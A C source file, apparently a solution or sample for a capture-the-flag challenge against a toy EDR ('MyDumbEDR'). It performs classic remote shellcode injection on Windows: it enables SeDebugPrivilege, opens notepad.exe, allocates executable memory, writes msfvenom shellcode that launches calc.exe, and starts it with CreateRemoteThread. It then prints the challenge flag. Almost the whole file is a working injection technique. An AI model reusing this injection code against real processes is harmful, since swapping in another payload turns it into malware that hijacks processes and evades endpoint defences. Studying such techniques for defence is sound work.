#include "stdio.h"
#include <Windows.h>
#include <TlHelp32.h>

int get_process_id_from_szexefile(wchar_t processName[]) {
	PROCESSENTRY32 entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(snapshot, &entry) == TRUE) {
		while (Process32Next(snapshot, &entry) == TRUE) {
			if (wcscmp(entry.szExeFile, processName) == 0) {
				return entry.th32ProcessID;
			}
		}
	}
	else {
		printf("CreateToolhelper32Snapshot failed : %d\n", GetLastError());
		exit(1);
	}
	printf("Process not found.\n");
	exit(1);
}

void check_if_se_debug_privilege_is_enabled() {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	HANDLE hToken;
	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	DWORD cbSize;
	GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize);
	PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, cbSize);
	GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, &cbSize);
	DWORD current_process_integrity = (DWORD)*GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

	TOKEN_PRIVILEGES tp;

	LUID luidSeDebugPrivilege;
	if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidSeDebugPrivilege) == 0) {
		printf("SeDebugPrivilege not owned\n");
	}
	else {
		printf("SeDebugPrivilege owned\n");
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luidSeDebugPrivilege;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {
		printf("SeDebugPrivilege adjust token failed: %d\n", GetLastError());
	}
	else {
		printf("SeDebugPrivilege enabled.\n");
	}

	CloseHandle(hProcess);
	CloseHandle(hToken);
}

int main() {
	printf("Launching remote shellcode injection\n");
	
	// DO NOT REMOVE
	// When loading a DLL remotely, its content won't apply until all DLL's are loaded
	// For some reason it leads to a race condition which is not part of the challenge
	// Hence do not remove the Sleep (even if it'd allow you bypassing the hooks)
	Sleep(5000);
	// DO NOT REMOVE
	check_if_se_debug_privilege_is_enabled();
	wchar_t processName[] = L"notepad.exe";
	int processId = get_process_id_from_szexefile(processName);
	printf("Injecting to PID: %i\n", processId);
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(processId));
	
	printf("VirtualAllocEx\n");
	// msfvenom -p windows/x64/exec CMD=calc.exe -b "\x00\x0a\0d" -f c
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xdb\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\x33\xef\x18\x46\xf8\x06\x62\xef\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xcf\xa7\x9b\xa2\x08\xee"
		"\xa2\xef\x33\xef\x59\x17\xb9\x56\x30\xbe\x65\xa7\x29\x94\x9d"
		"\x4e\xe9\xbd\x53\xa7\x93\x14\xe0\x4e\xe9\xbd\x13\xa7\x93\x34"
		"\xa8\x4e\x6d\x58\x79\xa5\x55\x77\x31\x4e\x53\x2f\x9f\xd3\x79"
		"\x3a\xfa\x2a\x42\xae\xf2\x26\x15\x07\xf9\xc7\x80\x02\x61\xae"
		"\x49\x0e\x73\x54\x42\x64\x71\xd3\x50\x47\x28\x8d\xe2\x67\x33"
		"\xef\x18\x0e\x7d\xc6\x16\x88\x7b\xee\xc8\x16\x73\x4e\x7a\xab"
		"\xb8\xaf\x38\x0f\xf9\xd6\x81\xb9\x7b\x10\xd1\x07\x73\x32\xea"
		"\xa7\x32\x39\x55\x77\x31\x4e\x53\x2f\x9f\xae\xd9\x8f\xf5\x47"
		"\x63\x2e\x0b\x0f\x6d\xb7\xb4\x05\x2e\xcb\x3b\xaa\x21\x97\x8d"
		"\xde\x3a\xab\xb8\xaf\x3c\x0f\xf9\xd6\x04\xae\xb8\xe3\x50\x02"
		"\x73\x46\x7e\xa6\x32\x3f\x59\xcd\xfc\x8e\x2a\xee\xe3\xae\x40"
		"\x07\xa0\x58\x3b\xb5\x72\xb7\x59\x1f\xb9\x5c\x2a\x6c\xdf\xcf"
		"\x59\x14\x07\xe6\x3a\xae\x6a\xb5\x50\xcd\xea\xef\x35\x10\xcc"
		"\x10\x45\x0e\x42\x07\x62\xef\x33\xef\x18\x46\xf8\x4e\xef\x62"
		"\x32\xee\x18\x46\xb9\xbc\x53\x64\x5c\x68\xe7\x93\x43\xf6\xd7"
		"\x4d\x65\xae\xa2\xe0\x6d\xbb\xff\x10\xe6\xa7\x9b\x82\xd0\x3a"
		"\x64\x93\x39\x6f\xe3\xa6\x8d\x03\xd9\xa8\x20\x9d\x77\x2c\xf8"
		"\x5f\x23\x66\xe9\x10\xcd\x05\xc2\x5a\x35\x86\x5d\x8b\x77\x31"
		"\x8b\x5a\x31\x96\x40\x9b\x7d\x2b\xcb\x34\x3e\x8c\x52\x83\x7b"
		"\x68\x9d\x7e\x07\xef";
	PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	printf("WriteProcessMemory\n");
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL);
	
	printf("CreateRemoteThread\n");
	HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	
	printf("Congratz dude! The flag is MyDumbEDR{H4ckTH3W0rld}\n");
	printf("Expect more checks in the upcoming weeks ;)\n");
	CloseHandle(processHandle);
	return 0;
}